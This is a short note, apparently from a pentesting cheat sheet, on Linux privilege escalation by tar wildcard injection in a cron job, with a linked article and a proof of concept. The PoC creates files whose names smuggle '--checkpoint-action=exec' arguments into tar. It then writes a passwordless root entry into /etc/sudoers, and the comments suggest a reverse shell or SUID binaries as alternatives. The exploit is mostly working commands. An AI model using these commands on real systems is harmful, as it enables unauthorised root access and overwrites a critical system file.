when .tar is combined with a wildcard in a cronjob, this makes for a fairly simple priv esc

https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa

PoC
```
# 1. Create files in the current directory called
# '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh'

echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'

# 2. Create a privesc.sh bash script, that allows for privilege escalation
#malicous.sh:
echo '<our_user> ALL=(root) NOPASSWD: ALL' > /etc/sudoers

#The above injects an entry into the /etc/sudoers file that allows the 'kali' 
#user to use sudo without a password for all commands
#NOTE: we could have also used a reverse shell, this would work the same!
#OR: Even more creative, you could've used chmod to changes the permissions
#on a binary to have SUID permissions, and PE that way
```